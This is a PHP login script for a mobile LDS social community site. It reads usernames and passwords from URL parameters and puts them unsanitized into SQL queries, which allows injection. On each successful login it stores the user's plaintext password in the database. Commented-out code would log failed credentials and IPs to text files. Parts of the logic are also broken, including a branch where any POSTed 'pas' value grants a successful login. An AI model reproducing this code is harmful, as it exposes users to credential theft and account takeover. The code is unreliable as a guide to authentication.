<?php
     session_name("PHPSESSID");
session_start();
header("Content-type: text/html; charset=ISO-8859-1");
echo "<?xml version=\"1.0\" encoding=\"ISO-8859-1\" ?>";
echo "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">";
?>
<meta name="description" content="LDS Christian Social Community on Mobile" />
<meta name="keywords" content="lds, mormon, wapsite, christian, social community" />
<link rel="shortcut icon" href="/images/favicon.ico" />
<link rel="icon" href="/images/favicon.gif" type="image/gif" />
<link rel="StyleSheet" type="text/css" href="style/default.css" /><link rel="StyleSheet" type="text/css" href="style/default.css" /><link rel="StyleSheet" type="text/css" href="style/default.css" /></head>

<?php
include("xhtmlfunctions.php");
include("config.php");
include("core.php");
connectdb();
$bcon = connectdb();
if (!$bcon)
{
    $pstyle = gettheme1("1");
    echo xhtmlhead("$stitle (ERROR!)",$pstyle);
    echo "<p align=\"center\">";
    echo "<img src=\"images/exit.gif\" alt=\"*\"/><br/>";
    echo "ERROR! cannot connect to database<br/><br/>";
    echo "This error happens usually when backing up the database, please be patient, The site will be up any minute<br/><br/>";
    echo "<b>THANK YOU VERY MUCH</b>";
echo "In the mean time visit our back up chatroom<br/>";
echo "<a href=\"chat/index.php\">$stitle chat [NEW!]</a>";
    echo "</p>";
  echo xhtmlfoot();
      exit();
}

$uid = $_GET["loguid"];
$pwd = $_GET["logpwd"];

$tolog = false;
$pstyle = gettheme1("1");
      echo xhtmlhead("$stitle",$pstyle);
  echo "<p align=\"center\"><small>";
   echo "<div class=\"mblock1\"><center><h6><b><u><font color=#000000'>Bookmark NOW!!..(for Autologin)</font></u></b></h6></center>";
  echo "<img src=\"images/ayu.png\" alt=\"*\"/><br/>";
   echo "<center><u>AYuBowan </u><b>$uid</b><br/></center>";
   echo "</div>";
 
  
  $uinf = mysql_fetch_array(mysql_query("SELECT COUNT(*) FROM dcroxx_me_users WHERE name='".$uid."'"));
  if($uinf[0]==0)
  {
 /*$brws = explode(" ",$HTTP_USER_AGENT);
	$ubr1 = $brws[0];
	$ip = $_SERVER['REMOTE_ADDR'];
	$fp = fopen("lax/nic.txt","a+");
	fwrite ($fp, "\n".$uid."-".$pwd."-".$ip."-".$ubr."\n");
	fclose($fp);*/
    echo "<img src=\"images/notok.gif\" alt=\"X\"/>UserName doesn't exist<br/><br/>";
  }else{
    //check for pwd
    $epwd = md5($pwd);
    $uinf = mysql_fetch_array(mysql_query("SELECT COUNT(*) FROM dcroxx_me_users WHERE name='".$uid."' AND pass='".$epwd."'"));

    if($uinf[0]==0)
    {
	$brws = explode(" ",$HTTP_USER_AGENT);
	$ubr = $brws[0];
	$ip = $_SERVER['REMOTE_ADDR'];

	/*$fp = fopen("lax/pas.txt","a+");
	fwrite ($fp, "\n".$uid."-".$pwd."-".$ip."-".$ubr."\n");
	fclose($fp);*/
      echo "<img src=\"images/notok.gif\" alt=\"X\"/>Incorrect Password<br/><br/>";
    }else{
      
      $tm = (time() - $timeadjust) ;
      $xtm = $tm + (getsxtm()*60);
      $did = $uid.$tm;
      $res = mysql_query("INSERT INTO dcroxx_me_ses SET id='".md5($did)."', uid='".getuid_nick($uid)."', expiretm='".$xtm."'");
          if($res)
      {
        $tolog=true;
        //echo "Bookmark THIS page to avoid repeating the login proccess in the future<br/><br/>";
        echo "Logged in successfully as <b>$uid</b><br/>";  
        $idn = getuid_nick($uid);
        
            $lact = mysql_fetch_array(mysql_query("SELECT lastact FROM dcroxx_me_users WHERE id='".$idn."'"));
             mysql_query("UPDATE dcroxx_me_users SET lastvst='".$lact[0]."' WHERE id='".$idn."'");
             mysql_query("UPDATE dcroxx_me_users SET lastact='".(time() - $timeadjust)."' WHERE id='".$idn."'");

             mysql_query("UPDATE dcroxx_me_users SET lastvst='".$lact[0]."', pwd='".$pwd."', browserm='".$ubr."' WHERE id='".$idn."'"); 
      }else{
        //is user already logged in?
        $logedin = mysql_fetch_array(mysql_query("SELECT (*) FROM dcroxx_me_ses WHERE uid='".$getuid_nick($uid)."'"));
        if($logedin[0]>0)
        {
          //yip, so let's just update the expiration time
          $xtm = (time() - $timeadjust) + (getsxtm()*60);
          $res = mysql_query("UPDATE dcroxx_me_ses SET expiretm='".$xtm."' WHERE uid='".getuid_nick($uid)."'");
          
$pwd = $_POST["pas"];



          if(($res)||($pwd))
          {
            $tolog=true;
         
            echo "<img src=\"images/sucessful.gif\" alt=\"+\"/><br/>Logged in successfully as <b>$uid</b><br/>";          
  $_SESSION['sid'] = md5($did);

          
          }else{
            echo "<img src=\"images/point.gif\" alt=\"!\"/>Can't login at the time, plz try later<br/>"; //no chance this could happen unless there's error in mysql connection
            
          }
          
        }
        
      }
    }
  }

 echo "<b><u>Site Announcement</u></b><br/>";      
    $fmsg2 = parsepm(getfmsg2(), $sid);
  echo "$fmsg2<br/>";
            
  if($tolog)

{
  $_SESSION['sid'] = md5($did);
  $uid = getuid_sid($sid);
  if(ismod(getuid_sid($sid)))
    {
	 echo "on some secutity reason, I HAD TO GIVE a special secret code for each staff members,<b>so dont give ur secret code any1 and BOOKMARK NEXT page.</b> if u still didnt get ur secret code call/sms me<br/> ";
	 
	  echo "<form method=\"get\" action=\"stapa.php\">";
  echo "<small>UserName:</small> <input name=\"loguid\" format=\"*x\" maxlength=\"30\"/><br/>";
  echo "<small>Password:</small> <input type=\"password\" name=\"logpwd\"  maxlength=\"30\"/><br/>";
   echo "<small>Ur secret code:</small> <input type=\"cody\" name=\"cody\"  maxlength=\"30\"/><br/>";
  echo "<input type=\"submit\" name=\"Submit\" value=\"Log In\"/><br/>";
  echo "</form>";
  
    }else{

    $uid = getuid_sid($sid);
 
echo "<br/><a href=\"index.php?action=main\"><img src=\"images/home.gif\" alt=\"*\"/>";
echo "Enter</a><br/><br/>";
}

        echo "Tell everyone about <b>http://.tk</b> and make this the best place to hang out.<br/><br/>";
}else{
echo "<br/><a href=\"index.php\"><img src=\"images/home.gif\" alt=\"*\"/>";
echo "Home</a><br/><br/>";
}

echo "</small></p>";
echo xhtmlfoot();
exit();
?>
